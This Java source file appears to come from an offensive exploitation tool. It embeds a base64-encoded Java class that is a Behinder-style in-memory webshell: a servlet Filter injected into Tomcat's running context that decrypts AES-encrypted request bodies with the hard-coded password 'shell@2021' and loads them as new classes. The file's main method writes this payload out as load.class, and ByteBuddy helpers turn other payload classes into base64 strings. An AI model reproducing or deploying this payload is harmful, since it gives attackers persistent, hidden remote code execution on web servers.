package cn.safe6.util;


import cn.safe6.payload.TomcatEchoAll;
import cn.safe6.payload.memshell.Behinder2;
import cn.safe6.payload.memshell.Behinder3;
import net.bytebuddy.ByteBuddy;

import java.io.*;
import java.nio.ByteBuffer;
import java.nio.CharBuffer;
import java.nio.charset.Charset;
import java.util.Arrays;
import java.util.Base64;

public class GetByteCodeUtil {

    public static void main(String[] args) throws Exception {
       decodeData();
       //encodeData();

        //getFileByBytes(Behinder3.getMemBehinder3Payload("shell@2021"),"load.class");
    }

    public static void decodeData() throws Exception {

        String data ="yv66vgAAADMBqQEADE1lbUJlaGluZGVyMwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQARTWVtQmVoaW5kZXIzLmphdmEBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHAAcBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgcACQEABnBhc3N3ZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABXRwYXRoAQACY3MBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAGPGluaXQ+AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYMABMAFAoACAAVAQAEQ29kZQEAAygpVgwAEwAYCgAIABkBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEACkV4Y2VwdGlvbnMBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24HAB4BAANtZDUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAA01ENQgAIgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAcAJAEAC2dldEluc3RhbmNlAQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwwAJgAnCgAlACgBABBqYXZhL2xhbmcvU3RyaW5nBwAqAQAIZ2V0Qnl0ZXMBAAQoKVtCDAAsAC0KACsALgEABmxlbmd0aAEAAygpSQwAMAAxCgArADIBAAZ1cGRhdGUBAAcoW0JJSSlWDAA0ADUKACUANgEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyBwA4AQAGZGlnZXN0DAA6AC0KACUAOwEABihJW0IpVgwAEwA9CgA5AD4BAAh0b1N0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwwAQABBCgA5AEIBAAt0b1VwcGVyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABEAEUKACsARgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAEgBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7DABKAEsKACsATAEAC3RvTG93ZXJDYXNlDABOAEUKACsATwEADVN0YWNrTWFwVGFibGUBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwwAVABVCgAIAFYBAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAWgBbCgAEAFwBAA9qYXZhL2xhbmcvQ2xhc3MHAF4BAAdpc0FycmF5AQADKClaDABgAGEKAF8AYgEAE1tMamF2YS9sYW5nL09iamVjdDsHAGQMAA8AEAkAAgBmAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAcAaAwAEQASCQACAGoBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQcAbAEAHWphdmF4LnNlcnZsZXQuanNwLlBhZ2VDb250ZXh0CABuAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAHAAcQoAXwByAQAKZ2V0UmVxdWVzdAgAdAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAdgB3CgBfAHgBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAHoBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAHwAfQoAewB+AQALZ2V0UmVzcG9uc2UIAIALAGkAXAgADwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAIQAhQoAXwCGAQAiamF2YS9sYW5nL3JlZmxlY3QvQWNjZXNzaWJsZU9iamVjdAcAiAEADXNldEFjY2Vzc2libGUBAAQoWilWDACKAIsKAIkAjAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwCOAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAJAAkQoAjwCSCAARAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsMAJcAmAsAaQCZAQARamF2YS91dGlsL0hhc2hNYXAHAJsKAJwAGQEADWphdmEvdXRpbC9NYXAHAJ4BAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAoAChCwCfAKIBAAdzZXNzaW9uCACkAQAQamF2YS9sYW5nL1N5c3RlbQcApgEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwwAqACpCQCnAKoBABNqYXZhL2lvL1ByaW50U3RyZWFtBwCsAQAHcHJpbnRsbgEABChJKVYMAK4ArwoArQCwAQAGaW5qZWN0CACyAQAHc3VjY2VzcwgAtAEACXNldEhlYWRlcgEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgwAtgC3CwBtALgMAAsADAkAAgC6DAAgACEKAAIAvAEAAXUIAL4BAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24HAMABAAhwdXRWYWx1ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgwAwgDDCwDBAMQBAANBRVMIAMYBABNqYXZheC9jcnlwdG8vQ2lwaGVyBwDIAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsMACYAygoAyQDLAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwcAzQEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWDAATAM8KAM4A0AEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWDAAbANIKAMkA0wEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QHANUBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwwA1wDYCwDWANkBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyBwDbAQAIcmVhZExpbmUMAN0ARQoA3ADeAQAVamF2YS5sYW5nLkNsYXNzTG9hZGVyCADgCABUAQACW0IHAOMBABFqYXZhL2xhbmcvSW50ZWdlcgcA5QEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwA5wDoCQDmAOkBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyBwDrCgDsABkBABlzdW4vbWlzYy9DaGFyYWN0ZXJEZWNvZGVyBwDuAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwA8ADxCgDvAPIBAAdkb0ZpbmFsAQAGKFtCKVtCDAD0APUKAMkA9gEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwA+AD5CgBfAPoMABMArwoA5gD8AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwA/gD/CgBfAQABAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAQIBAwoABAEEAQATamF2YS9sYW5nL1Rocm93YWJsZQcBBgEAD3ByaW50U3RhY2tUcmFjZQwBCAAYCgEHAQkBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluBwELAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgwAlQENCwEMAQ4BABNqYXZhL2lvL0lPRXhjZXB0aW9uBwEQAQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UHARIBAAdkZXN0cm95AQAJYWRkRmlsdGVyAQB1KExqYXZheC9zZXJ2bGV0L0ZpbHRlcjtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmEvbGFuZy9TdHJpbmc7AQARZ2V0U2VydmxldENvbnRleHQBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwwBFwEYCwDWARkBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0BwEbAQAVZ2V0RmlsdGVyUmVnaXN0cmF0aW9uAQA2KExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb247DAEdAR4LARwBHwsBHABcAQAHY29udGV4dAgBIgEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkNvbnRleHQHASQBAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0BwEmAQAmb3JnL2FwYWNoZS9jYXRhbGluYS91dGlsL0xpZmVjeWNsZUJhc2UHASgBAAVzdGF0ZQgBKgEAIm9yZy9hcGFjaGUvY2F0YWxpbmEvTGlmZWN5Y2xlU3RhdGUHASwBAA1TVEFSVElOR19QUkVQAQAkTG9yZy9hcGFjaGUvY2F0YWxpbmEvTGlmZWN5Y2xlU3RhdGU7DAEuAS8JAS0BMAEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwBMgEzCgCPATQBAFQoTGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L3NlcnZsZXQvRmlsdGVyOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYzsMARUBNgsBHAE3AQAcamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZQcBOQEAB1JFUVVFU1QBAB5MamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZTsMATsBPAkBOgE9AQARamF2YS91dGlsL0VudW1TZXQHAT8BAAJvZgEAJShMamF2YS9sYW5nL0VudW07KUxqYXZhL3V0aWwvRW51bVNldDsMAUEBQgoBQAFDAQAgamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24HAUUBABhhZGRNYXBwaW5nRm9yVXJsUGF0dGVybnMBACooTGphdmEvdXRpbC9FbnVtU2V0O1pbTGphdmEvbGFuZy9TdHJpbmc7KVYMAUcBSAsBRgFJAQALZmlsdGVyU3RhcnQIAUsBAAlnZXRNZXRob2QMAU0AdwoAXwFOAQAHU1RBUlRFRAwBUAEvCQEtAVEBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlck1hcAgBUwEAJG9yZy5hcGFjaGUuY2F0YWxpbmEuZGVwbG95LkZpbHRlck1hcAgBVQEADmZpbmRGaWx0ZXJNYXBzCAFXAQANZ2V0RmlsdGVyTmFtZQgBWQEAEGVxdWFsc0lnbm9yZUNhc2UBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoMAVsBXAoAKwFdAQAJYXJyYXljb3B5AQAqKExqYXZhL2xhbmcvT2JqZWN0O0lMamF2YS9sYW5nL09iamVjdDtJSSlWDAFfAWAKAKcBYQEADmluamVjdCBzdWNjZXNzCAFjAQAKZ2V0TWVzc2FnZQwBZQBFCgEHAWYBABVGaWx0ZXIgYWxyZWFkeSBleGlzdHMIAWgBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgcBagEAKGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uJER5bmFtaWMHAWwMAFgAWQoAAgFuAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgcBcAoBcQAZAQADLT58CAFzAQADfDwtCAF1AQAJdGV4dC9odG1sCAF3AQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMAXkBegsBEwF7DAAOAAwJAAIBfQEAFHNldENoYXJhY3RlckVuY29kaW5nDAF/AXoLANYBgAsBEwGAAQAaTWVtQmVoaW5kZXIzODc1MzI1ODc4OTkxNzkIAYMBAAp0aGlzLnRwYXRoCAGFDAEVARYKAAIBhwEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7DAGJAYoKAXEBiwEACUVSUk9SOi8vIAgBjQwAQABFCgEHAY8KAXEBjwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7DAGSAZMLARMBlAEAE2phdmEvaW8vUHJpbnRXcml0ZXIHAZYBAAVwcmludAwBmAF6CgGXAZkBAAVmbHVzaAwBmwAYCgGXAZwBAAVjbG9zZQwBngAYCgGXAZ8BAApzaGVsbEAyMDIxCAGhAQAML2Zhdmljb24uaWNvCAGjDAANAAwJAAIBpQEABVVURi04CAGnACEAAgAIAAEACgAFAAEACwAMAAAAAQANAAwAAAABAA4ADAAAAAEADwAQAAAAAQARABIAAAAKAAEAEwAUAAEAFwAAADEAAgACAAAAJSortwAWKhMBorUAuyoTAaS1AaYqEwGotQF+KgG1AGcqAbUAa7EAAAAAAAEAEwAYAAEAFwAAADAAAgABAAAAJCq3ABoqEwGitQC7KhMBpLUBpioTAai1AX4qAbUAZyoBtQBrsQAAAAAAAQAbABwAAgAXAAAADQAAAAIAAAABsQAAAAAAHQAAAAQAAQAfAAkAIAAhAAEAFwAAAGkABAAEAAAAPAFMEiO4AClNLCq2AC8DKrYAM7YAN7sAOVkELLYAPLcAPxAQtgBDtgBHTKcAB06nAAMrAxAQtgBNtgBQsAABAAIAKgAtAEkAAQBRAAAAEwAC/wAtAAIHACsHACsAAQcASQMAAQBSAFMAAQAXAAAAFQAEAAIAAAAJKisDK763AFewAAAAAAABAFgAWQABABcAAAFVAAQACgAAAN4rtgBdtgBjmQAiK8AAZcAAZU0qLAMywABptQBnKiwEMsAAbbUAa6cAtxJvuABzTiotEnUBtgB5KwG2AH/AAGm1AGcqLRKBAbYAeSsBtgB/wABttQBrpwCIOgQrwQBpmQB8KivAAGm1AGcqtABnuQCCAQASg7YAhzoFGQUEtgCNGQUqtABntgCTwABpOgYZBrkAggEAEpS2AIc6BxkHBLYAjSoZBxkGtgCTwABttQBrpwArOggqKrQAZ7kAggEAEoEBtgB5KwG2AH/AAG21AGunAAg6CacAA6cAA6cAA7EAAwApAFUAWABJAGkArwCyAEkAtADPANIASQABAFEAAABNAAcpbgcASf8AWQAFBwACBwAEAAAHAEkAAQcASf8AHwAJBwACBwAEAAAHAEkAAAAHAEkAAQcASQT/AAIABQcAAgcABAAABwBJAAD4AAIAAQCVAJYAAgAXAAABZQAIABAAAAEjK8AAaToELMAAbToFGQS5AJoBADoGuwCcWbcAnToHGQcSgxkEuQCjAwBXGQcSlBkFuQCjAwBXGQcSpRkGuQCjAwBXsgCrEG+2ALEZBRKzErW5ALkDACq0ALu4AL06CBkGEr8ZCLkAxQMAEse4AMw6CbsAzlkZCLYALxLHtwDROgoZCQUZCrYA1BkEuQDaAQC2AN86CxLhuABzEuIGvQBfWQMS5FNZBLIA6lNZBbIA6lO2AHk6DBkMBLYAjRkJuwDsWbcA7RkLtgDztgD3Og0ZDCq2AF22APsGvQAEWQMZDVNZBLsA5lkDtwD9U1kFuwDmWRkNvrcA/VO2AH/AAF86DhkOtgEBGQe2AQVXpwANOg8ZD7YBCqcAAy0ZBBkFuQEPAwCxAAEAaQELAQ4ASQABAFEAAAAoAAL/AQ4ACQcAAgcA1gcBEwcBDAcAaQcAbQcAwQcAnAcAKwABBwBJCQAdAAAABgACAREAHwABARQAGAABABcAAAANAAAAAQAAAAGxAAAAAAAJARUBFgACABcAAANgAAcAFwAAAastuQEaAQA6BBkEK7kBIAIAAaYBlgE6BQE6BgE6BwE6CAE6CRkEuQEhAQATASO2AIc6BRkFBLYAjRkFGQS2AJPAASU6BhkGtgBdEwEjtgCHOgUZBQS2AI0ZBRkGtgCTwAEnOgcTASkTASu2AIc6CBkIBLYAjRkIGQeyATG2ATUZBCsquQE4AwA6CRkJsgE+uAFEAwS9ACtZAyxTuQFKBAATAScTAUwBtgFPOgsZCwS2AI0ZCxkHAbYAf1cZCBkHsgFStgE1AToKEwFUuABzOgynABA6DRMBVrgAczoMpwADGQwBpQCFGQe2AF0TAVgBtgFPOg4ZDhkHAbYAf8AAZToPGQ++vQAEOhAENhEDNhIVEhkPvqIASBkPFRIyOhMZDBMBWgG2AU86DhkOGRMBtgB/wAArOhQZFBkUtgFemQAMGRADGRNTpwAQGRAVEYQRARkPFRIyU4QSAaf/thkQAxkPAxkPvrgBYhMBZDoVpwAhGRWwOhYZFrYBZzoKpwAfOhYZCBkHsgFStgE1GRa/GQgZB7IBUrYBNaf/2BkIGQeyAVK2ATUZCrATAWmwAAMAxwDPANIASQAjAXIBcgBJACMBfgF+AAAAAQBRAAABiwAN/wDSAAwHAAoHACsHACsHAGkHARwHAI8HASUHAScHAI8HAW0FBwB7AAEHAEn8AAwHAF//AC4AEwcACgcAKwcAKwcAaQcBHAcAjwcBJQcBJwcAjwcBbQUHAHsHAF8ABwB7BwBlBwBlAQEAAP0AOQcABAcAKwz5AAX/AAsADQcACgcAKwcAKwcAaQcBHAcAjwcBJQcBJwcAjwcBbQUHAHsHAF8AAP8ABwAWBwAKBwArBwArBwBpBwEcBwCPBwElBwEnBwCPBwFtBQcAewcAXwAAAAAAAAAABwArAAD/AAIACgcACgcAKwcAKwcAaQcBHAcAjwcBJQcBJwcAjwcBbQABBwBJSwcBB/8ADgAWBwAKBwArBwArBwBpBwEcBwCPBwElBwEnBwCPBwFtBQcAewcAXwAAAAAAAAAABwArAAD/AAwAFwcACgcAKwcAKwcAaQcBHAcAjwcBJQcBJwcAjwcBbQcAKwAAAAAAAAAAAAAABwBJAAD/AAwABQcACgcAKwcAKwcAaQcBHAAAAB0AAAAEAAEBawABAQIBAwABABcAAAEDAAUABwAAAL4qK7YBb7sBcVm3AXJNEwF0ThMBdjoEKrQAaxMBeLkBfAIAKrQAZyq0AX65AYECACq0AGsqtAF+uQGCAgAsKlcqEwGEEwGGKrQAZ7gBiLYBjFenACU6BSy7AXFZtwFyEwGOtgGMGQW2AZC2AYy2AZG2AYxXpwADKrQAa7kBlQEAuwFxWbcBci22AYwstgGRtgGMGQS2AYy2AZG2AZoqtABruQGVAQC2AZ0qtABruQGVAQC2AaCnAAg6BqcAAwSsAAIAFgBRAFQASQB2ALQAtwBJAAEAUQAAACMABP8AVAAFBwACBwAEBwFxBwArBwArAAEHAEkh9wBABwBJBAABAAUAAAACAAY=";
        System.out.println(data);
        System.out.println("oldLen:"+data.length());
        getFileByBytes(Base64.getDecoder().decode(data),"load.class");

        //对比生成前后，长度差距
        //String newData = Base64.getEncoder().encodeToString(getBytesForFile("load.class"));
        //System.out.println(newData);
        //System.out.println("newLen:"+ newData.length());

    }

    public static void encodeData(){
        byte[] code= new ByteBuddy()
                .redefine(cn.safe6.payload.memshell.BehinderLoader2.class)
                .name("cn.safe6.payload.memshell.BehinderLoader2")
                .make()
                .getBytes();
        System.out.println(Base64.getEncoder().encodeToString(code));
    }

    public static String getEncodeData(Class className){
        byte[] code= new ByteBuddy()
                .redefine(className)
                .name(className.getName())
                .make()
                .getBytes();
        return Base64.getEncoder().encodeToString(code);
    }

    public static byte[] getDataBytes(Class className){
        byte[] code= new ByteBuddy()
                .redefine(className)
                .name(className.getName())
                .make()
                .getBytes();
        return code;
    }


    //将Byte数组转换成文件
    public static void getFileByBytes(byte[] bytes, String fileName) {
        BufferedOutputStream bos = null;
        FileOutputStream fos = null;
        File file = null;
        try {
            file = new File(fileName);
            fos = new FileOutputStream(file);
            bos = new BufferedOutputStream(fos);
            bos.write(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (bos != null) {
                try {
                    bos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }


    public static byte[] getBytesForFile(String fileName) {
        BufferedInputStream bos = null;
        FileInputStream fos = null;
        File file = new File(fileName);
        byte[] b = new byte[(int)file.length()];
        try {
            fos = new FileInputStream(file);
            bos = new BufferedInputStream(fos);
            bos.read(b);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (bos != null) {
                try {
                    bos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return b;
    }

    public static byte[] getBytes(char[] chars) {
        Charset cs = Charset.forName("UTF-8");
        CharBuffer cb = CharBuffer.allocate(chars.length);
        cb.put(chars);
        cb.flip();
        ByteBuffer bb = cs.encode(cb);
        return bb.array();
    }




}
